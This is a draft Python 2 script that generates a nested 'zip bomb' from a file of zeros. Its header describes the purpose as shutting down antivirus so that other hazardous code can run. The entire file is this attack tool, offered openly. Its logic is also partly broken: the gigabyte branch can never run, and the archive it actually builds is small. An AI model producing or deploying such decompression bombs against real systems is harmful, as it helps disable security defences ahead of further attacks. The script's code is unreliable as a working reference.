'''
Joshua Franke
Creates a Zip Bomb (without malicious code in it)
Version: Alpha 

A zipbomb is a series of highly compressed files that is used to shut down an
antivirus so other hazardous code can run. Most modern antivirus programs
know how to treat these files now.



THIS IS A ROUGH DRAFT. THE CODE WILL BE PRETTIER SOON. (Ex: Adding loops,
looking for different methods, orginization, adding print statements for the console, etc.)
'''

############################ Variables ######################################
#############################################################################
import zipfile
import shutil
import os

# numBytes isn't needed but I left it here in order to show the logic.
numBytes = 1
numKilos = 1024 * numBytes
numMegas = 1024 * numKilos


numGigas = 0 # Place holder




'''                           Side Note

You get a memory error by using numGigas the way I have created the other
variables. In order to avoid this problem I created a nested for loop.
'''



# Change this to change how many 0s to write to the file.
num = numMegas
###############################################################################






######################### Write to File Functions #############################
###############################################################################
# If you want a file smaller than multiple Gigs this will write that many 0s
def other():
    for x in range(0,num):
        file.write("0")
    file.close()


# If you want a file larger than a Gig this will write that many 0s
def GigFunction():
    count = 0
    for x in range(0,1024):
        for x in range(0,num):
            file.write("0")
        count += 1
        print str(count) + " MB Written"
    file.close()

###############################################################################









############################# Copy & Zipping Function #########################
###############################################################################
def copyNzip():
    # Creates a zip file
    zf = zipfile.ZipFile("first.zip","w")
    # Without compress_type with file will not be smaller
    zf.write("run.txt",compress_type=zipfile.ZIP_DEFLATED)
    zf.close()

    os.remove("run.txt")
    
    # Will edit soon
    
    zf = zipfile.ZipFile("second.zip","w")
    zf.write("first.zip",compress_type=zipfile.ZIP_DEFLATED)
    os.rename("first.zip","first2.zip")
    zf.write("first2.zip",compress_type=zipfile.ZIP_DEFLATED)
    
    os.rename("first2.zip","first3.zip")
    zf.write("first3.zip",compress_type=zipfile.ZIP_DEFLATED)
    
    os.rename("first3.zip","first4.zip")
    zf.write("first4.zip",compress_type=zipfile.ZIP_DEFLATED)
    
    os.rename("first4.zip","first5.zip")
    zf.write("first5.zip",compress_type=zipfile.ZIP_DEFLATED)
    
    os.rename("first5.zip","first6.zip")
    zf.write("first6.zip",compress_type=zipfile.ZIP_DEFLATED)
    
    os.rename("first6.zip","first7.zip")
    zf.write("first7.zip",compress_type=zipfile.ZIP_DEFLATED)
    
    os.rename("first7.zip","first8.zip")
    zf.write("first8.zip",compress_type=zipfile.ZIP_DEFLATED)
    
    os.rename("first8.zip","first9.zip")
    zf.write("first9.zip",compress_type=zipfile.ZIP_DEFLATED)

    os.rename("first9.zip","first10.zip")
    zf.write("first10.zip",compress_type=zipfile.ZIP_DEFLATED)

    os.rename("first10.zip","first11.zip")
    zf.write("first11.zip",compress_type=zipfile.ZIP_DEFLATED)

    os.rename("first11.zip","first12.zip")
    zf.write("first12.zip",compress_type=zipfile.ZIP_DEFLATED)

    os.rename("first12.zip","first13.zip")
    zf.write("first13.zip",compress_type=zipfile.ZIP_DEFLATED)

    os.rename("first13.zip","first14.zip")
    zf.write("first14.zip",compress_type=zipfile.ZIP_DEFLATED)

    os.rename("first14.zip","first15.zip")
    zf.write("first15.zip",compress_type=zipfile.ZIP_DEFLATED)

    os.rename("first15.zip","first16.zip")
    zf.write("first16.zip",compress_type=zipfile.ZIP_DEFLATED)

    
    zf.close() 
    os.remove("first16.zip")

    
    
###############################################################################






################################ Main Code ####################################
###############################################################################
# Creates a file called run.txt
file = open("run.txt","w")
    
# Find correct function to call
if num == numGigas:
    num = numMegas
    GigFunction()
else:
    other()
    copyNzip()
###############################################################################
